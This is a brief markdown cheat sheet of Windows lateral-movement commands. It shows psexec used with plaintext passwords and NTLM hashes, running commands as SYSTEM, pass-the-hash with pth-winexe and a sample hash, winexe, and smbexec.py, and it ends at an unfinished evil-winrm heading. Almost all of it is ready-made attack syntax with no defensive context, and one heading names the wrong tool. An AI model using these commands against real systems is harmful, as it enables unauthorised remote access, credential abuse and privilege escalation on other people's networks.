###### psexec: execute file hostes on remote system with specified credentials  
`psexec /accepteula \\<targetIP> -u domain/user -p password -c -f \\<smbIP>\share\file.exe  `
###### psexec: run remote command with specified Hash  
`psexec /accepteula \\<ip> -u Domain/user -p <LM>:<NTLM> cmd.exe /c dir c:\Progra~1  `
###### pscexec: run remote command as system  
`psexec /accepteula \\<ip> -s cmd.exe`
###### you can use wmiexec.py
`$ psexec test/fcasl:Passw0rd@192.168.1.58`
###### 1. Use pth-winexe for pass the hash attack
`pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe`
###### 2.Use the hash with pth-winexe to spawn a SYSTEM level command prompt:
`pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe`
###### Using winexe
`winexe -U 'admin%password123' //TARGETIP cmd.exe`
###### Using smbexec 
`$ smbexec.py administrator:password@ip-address`
###### Use evil-winrm for winrm login